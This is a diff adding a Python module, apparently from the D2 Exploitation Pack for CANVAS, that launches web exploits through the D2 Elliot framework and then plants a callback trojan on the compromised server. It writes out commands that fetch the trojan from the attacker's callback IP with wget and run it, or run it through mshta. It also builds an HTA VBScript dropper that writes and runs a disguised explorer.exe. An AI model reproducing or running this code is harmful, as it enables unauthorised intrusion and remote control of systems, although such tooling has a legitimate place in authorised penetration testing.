@@ -1,0 +1,420 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+import sys, os, cStringIO, time, thread
+import urllib, json
+import libs.spkproxy as spkproxy
+import pygtk
+import gobject
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+from canvaserror import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import canvasengine
+from ExploitTypes.php_multi import *
+from libs.spkproxy import header, body
+
+# GUI info
+NAME = "d2sec_elliot"
+DESCRIPTION = "Exploit a web vulnerability with D2 Elliot" 
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['Date public'] = ""
+DOCUMENTATION['References'] = ""
+DOCUMENTATION['Versions Affected'] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+
+DOCUMENTATION["Notes"] = """If you have the D2 Elliot Web Exploitation Framework"""
+
+PROPERTY={}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+
+class theexploit(tcpexploit):
+
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.setInfo(DESCRIPTION)    
+    self.name = NAME
+    self.elliot_server = '127.0.0.1'
+    self.elliot_port = 8080
+    self.base = ''
+    self.url = ''
+    self.cookie = ''
+    self.oid = ''
+    self.exploits = ''
+    self.trojanname = "index.hta"
+    self.os = "Linux" 
+
+  ### Mosdef
+  def file4hta(self, exename):
+    evilprog = "explorer.exe"
+    e = []
+    for a in exename:
+      for b in a:
+        if b == "\r":
+          d = "0d"
+        elif b == "\n":
+          d = "0a"
+        elif b == "\0":
+          d = "00"
+        else:
+          c = hex(ord(b))
+          d = c.replace("0x", "")
+        if len(d) == 1:
+          d = "0"+d
+        e.append(d)
+    i = 0
+    j = 0
+    l = len(e)
+    hta = "<SCRIPT language=vbs>\n\n"
+    while 1:
+      hta += " prog = prog & \""
+      while i != 24:
+        hta += "%s," % e[j]
+        if j == l-1:
+          break
+        i += 1
+        j += 1
+      if j == l-1:
+        hta = hta[:-1] + "\"\n\n"
+        break
+      hta += "\"\n"
+      i = 0
+    hta += " tmp = Split(prog, \",\")\n"
+    hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+    hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+    hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+    hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+    hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+    hta += " For i = 0 To UBound(tmp)\n"
+    hta += "   prog = Int(\"&H\" & tmp(i))\n"
+    hta += "   f.Write Chr(prog)\n"
+    hta += " Next\n\n"
+    hta += " f.Close\n"
+    hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+    hta += " self.Close\n"
+    hta += "</SCRIPT>\n"
+    return hta
+
+  def neededListenerTypes(self):
+    import canvasengine
+    return [canvasengine.UNIVERSAL_MOSDEF]
+
+  def maketrojan(self):
+    from libs.canvasos import canvasos
+    my_os = canvasos(self.os)
+    my_os.arch = 'X86'
+    self.log("Creating a callback to %s:%s"%(self.callback.ip, self.callback.port))
+    if not self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=my_os, universal=True):
+      return 0
+    if self.os == "Windows":
+      self.htafile = self.file4hta(self.mosdeftrojan)
+      file(self.trojanname, "wb").write(self.htafile)
+      self.setInfo("%s - done"%(NAME))
+    else:
+      file(self.trojanname, "wb").write(self.mosdeftrojan)
+    ret = len(self.mosdeftrojan) != 0
+    return ret
+
+  def makesploit(self, clientheader, clientbody):
+    h = header('SERVER')
+    b = body()
+    self.maketrojan()
+    if clientheader.URL.count(self.trojanname):
+      self.log("[D2] Sending MOSDEF trojan")
+      f = open(self.trojanname, "rb")
+      sploitstring = f.read()
+      f.close()
+      os.remove(self.trojanname)
+      self.log("[D2] Sending %d bytes"%len(sploitstring))
+      h.addHeader("Content-type","binary/octet-stream")
+      h.addHeader("Connection","close")
+      b.setBody(sploitstring)
+    return h, b
+
+  def listen(self):
+    s=self.gettcplistener(80, "0.0.0.0")
+    if not s:
+      self.log("[D2] Cannot listen on port 80 - perhaps that port is already bound?")
+      return 0
+    s.set_timeout(5)
+    self.s=s
+    return s
+
+  def accept(self, s=None ):
+    if s==None:
+      s=self.s
+    try:
+      infd,addr=s.accept()
+    except timeoutsocket.Timeout:
+      return
+    if infd==-1:
+      return
+    self.handle(infd)
+    return True
+
+  def handle(self, infd):
+    self.log("[D2] Handling connection")
+    clientheader = header(state = "SERVER")
+    clientheader.ssl = self.ssl
+    ret = clientheader.readdata(infd)
+    clientbody = body()
+    if clientheader.gotGoodHeader():
+      if clientheader.bodySize()>0 or clientheader.wasChunked:
+        self.log("[D2] Reading body")
+        clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+        self.log("[D2] Read body")
+    self.log("[D2] Creating exploit response")
+    servheader,servbody = self.makesploit(clientheader,clientbody)
+    self.log("[D2] Responding")
+    bodydata="".join(servbody.data)
+    response = ""
+    response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+    self.log(response)
+    for akey in servheader.headerValuesDict.keys():
+      if akey not in [ "Content-Length", "Content-length"]:
+        response += servheader.grabHeader(akey)
+    self.log("[D2] Sending header data of %d bytes"%len(response))
+    chunked=0
+    if not chunked:
+      response+="Content-Length: "+str(len(bodydata))+"\r\n"
+    response+="\r\n"
+    response+="".join(bodydata)
+    self.log("[D2] Total response length is %d bytes"%len(response))
+    try:
+      infd.sendall(response)
+    except socket.error:
+      self.log("[D2] Connection closed by peer")
+    self.log("[D2] Response sent")
+    infd.close()
+    return
+
+  def startHTTPServer(self):
+    s=self.listen()
+    if not s:
+      self.log("[D2] Failed to listen - not running")
+      return 0
+    while 1:
+      if self.state==self.HALT:
+        self.s.close()
+        break
+      self.accept()
+    self.setInfo("[D2] %s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
+    return 1
+
+  ### Elliot
+  def _request(self, type, uri, data):
+    try:
+      extraheaders = [("User-Agent", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)")]
+      verb = 'GET'
+      if type == 'post':
+        verb = 'POST'
+        if 'website' in data:
+          extraheaders.append(("Content-Type", "application/json"))
+        else:        
+          extraheaders.append(("Content-Type", "application/x-www-form-urlencoded"))
+      if self.cookie:        
+        extraheaders.append(("Cookie", self.cookie))
+      handle = spkproxy.urlopen('%s/%s'%(self.base, uri), data=data, extraheaders=extraheaders, verb=verb)
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return None 
+    return handle.read()
+
+  def get_exploits(self):
+    return self._request('get', 'api/exploits/', '')
+
+  def get_parameters(self, uid):
+    return self._request('post', 'api/exploits/parameters', 'uid=%s'%uid)
+
+  def create_newwebsite(self):
+    headers = urllib.urlopen(self.base).headers.headers
+    for header in headers:
+      if 'Set-Cookie' in header:
+        self.cookie = header.split(' ')[1][:-1]
+    return self._request('post', 'api/kb/websites/new', "url=%s&proxy="%self.url)  
+
+  def launch_attack(self, oid, uid, payload, family, args):
+    postdata = {}
+    postdata['website'] = oid
+    postdata['exploit'] = {'uid':uid, "args":args}
+    if payload == 'cmd' and family == 'rce':
+      postdata['payload'] = {'uid':'P-38', "args":{}}
+    if payload == 'php' and family == 'upload':
+      postdata['payload'] = {'uid':'P-15', "args":{}}
+    if payload == 'java' and family == 'upload':
+      postdata['payload'] = {'uid':'P-10', "args":{}}
+    if payload == 'php' and family == 'rfi':
+      postdata['payload'] = {'uid':'P-21', "args":{}}
+    data = json.dumps(postdata)
+    return self._request('post', 'api/attacks/new', data)
+
+  def attack_details(self, oid):
+    return self._request('post', 'api/attacks/detail', 'oid=%d'%oid)
+
+  def send_command(self, session, cmd):
+    ### TODO 
+    cmd = cmd.replace(' ', '%20')
+    cmd = cmd.replace('+', '%2b')
+    return self._request('post', 'api/sessions/send_cmd', "oid=%d&cmd=%s"%(session, cmd))
+  
+  ### GUI
+  def cancel(self, widget):
+    self.dlg.destroy()
+
+  def startGUI(self):
+    self.column_names = ['Name', 'Auth', 'Description', 'CVE']
+    self.gladefile = os.getcwd()+'/3rdparty/D2SEC/exploits/d2sec_elliot/dialog2.glade2'
+
+    self.wTree = gtk.glade.XML(self.gladefile)
+    dic = {"on_cancel_clicked" : self.cancel,
+      "on_exploit_clicked" : self.run_exploit}
+    self.wTree.signal_autoconnect(dic)
+    self.dlg = self.wTree.get_widget("exploit_dialog")
+    self.dlg.set_size_request(800, 300)
+    self.dlg.set_icon_from_file(os.getcwd()+'/3rdparty/D2SEC/exploits/d2sec_elliot/d2.ico')
+
+    self.treeview = self.wTree.get_widget("mytree")
+    self.treeList = gtk.ListStore(str, str, str, str)
+    self.treeList.set_sort_column_id(0, gtk.SORT_ASCENDING)
+    self.treeview.set_model(self.treeList)
+    self.treeselection = self.treeview.get_selection()
+
+    self.column = [None] * len(self.column_names)
+
+    self.column[0] = gtk.TreeViewColumn(self.column_names[0], gtk.CellRendererText(), text=0)
+    self.column[0].set_resizable(True)
+
+    self.column[1] = gtk.TreeViewColumn(self.column_names[1], gtk.CellRendererText(), text=1)
+    self.column[1].set_resizable(True)
+
+    self.column[2] = gtk.TreeViewColumn(self.column_names[2], gtk.CellRendererText(), text=2)
+    self.column[2].set_resizable(True)
+
+    self.column[3] = gtk.TreeViewColumn(self.column_names[3], gtk.CellRendererText(), text=3)
+    self.column[3].set_resizable(True)
+
+    self.treeview.append_column(self.column[0])
+    self.treeview.append_column(self.column[1])
+    self.treeview.append_column(self.column[2])
+    self.treeview.append_column(self.column[3])
+    
+    self.exploitbutton = self.wTree.get_widget("exploitbutton")
+
+    self.exploits = json.loads(self.get_exploits())['exploits']
+    for exploit in self.exploits:
+      if exploit['family'] != 'rce' and exploit['family'] != 'rfi' and exploit['family'] != 'upload': 
+        continue
+      auth = ''
+      if exploit['postauth'] == True: auth = 'Yes'
+      if exploit['postauth'] == False: auth = 'No'
+      desc = exploit['description']
+      self.treeList.append([exploit['name'], auth, desc.strip(), exploit['cvelist']])
+
+    self.dlg.set_position(gtk.WIN_POS_CENTER_ALWAYS)
+    self.dlg.show()
+
+  def run_exploit(self, widget):
+    name = euid = payload = family = ''
+    args = {}
+
+    self.url = self.wTree.get_widget("url").get_text()
+    self.os = self.wTree.get_widget("os").get_active_text()
+    thread.start_new_thread(self.startHTTPServer,())
+
+    if (self.treeselection.count_selected_rows() > 0):
+      model, paths = self.treeselection.get_selected_rows()
+      for path in paths:
+        iter = self.treeList.get_iter(path)
+        name = model.get_value(iter, 0)
+    for exploit in self.exploits:
+      if exploit['name'] == name: 
+        euid = exploit['uid']
+        payload = exploit['payload']
+        family = exploit['family']
+    
+    try:
+      nfo = self.get_parameters(euid)
+      nfo = json.loads(nfo)
+    except Exception, e:
+      self.log('[D2] %s'%e)
+      return 0
+    if nfo['parameters']['badchars']['default']:
+      self.log('[D2] badchars parameter not null !')
+      return 0  
+
+    for key in nfo['parameters']:
+      if "app_username" == key:
+        args['app_username'] = self.wTree.get_widget("app_username").get_text()
+        args['app_password'] = self.wTree.get_widget("app_password").get_text() 
+        if args['app_username'] == '' or args['app_password'] == '':
+          self.log("[D2] username and password aren't specified")
+          return 0
+    nfo = json.loads(self.create_newwebsite())
+    if nfo['success'] != True:
+      self.log('[D2] Can\'t create new web site. See Elliot logs')
+      return 0
+    oid = nfo['oid']
+    nfo = json.loads(self.launch_attack(oid, euid, payload, family, args))
+    if nfo['success'] != True:
+      self.log('[D2] Attack failed. See Elliot logs')
+      return 0
+    time.sleep(5)
+    session = json.loads(self.attack_details(oid))['attack']['session']
+    if not session:
+      self.log('[D2] Attack failed. See Elliot logs')
+      return 0
+    if self.os == "Linux":
+      self.send_command(session, "uname -a")
+      self.send_command(session, "/usr/bin/wget -O /tmp/"+self.trojanname+" http://"+self.callback.ip+"/"+self.trojanname)
+      self.send_command(session, "chmod +x /tmp/"+self.trojanname)
+      self.send_command(session, "/tmp/"+self.trojanname)
+    if self.os == "Windows":
+      self.send_command(session, "mshta.exe http://"+self.callback.ip+"/"+self.trojanname)
+    return 1
+
+  def do_gui_operation(self, function, *args, **kw):
+    def idle_func():
+      gtk.gdk.threads_enter()
+      try:
+        function(*args, **kw)
+        return False
+      finally:
+        gtk.gdk.threads_leave()
+    gobject.idle_add(idle_func)
+
+  ### Module CANVAS
+  def run(self):
+    self.setInfo('[D2] %s - running' % NAME)
+    self.elliot_server = self.argsDict.get("elliot_server",self.elliot_server)
+    self.elliot_port = int(self.argsDict.get("elliot_port",self.port))
+    self.base = 'http://%s:%d' % (self.elliot_server, self.elliot_port)
+    for node in self.argsDict["passednodes"]:
+      self.node = node
+      self.do_gui_operation(self.startGUI)
+    self.setInfo('[D2] %s - done' % NAME)
+    return 1
+
+if __name__ == "__main__":
+  print "This module is meant to be run only within CANVAS"
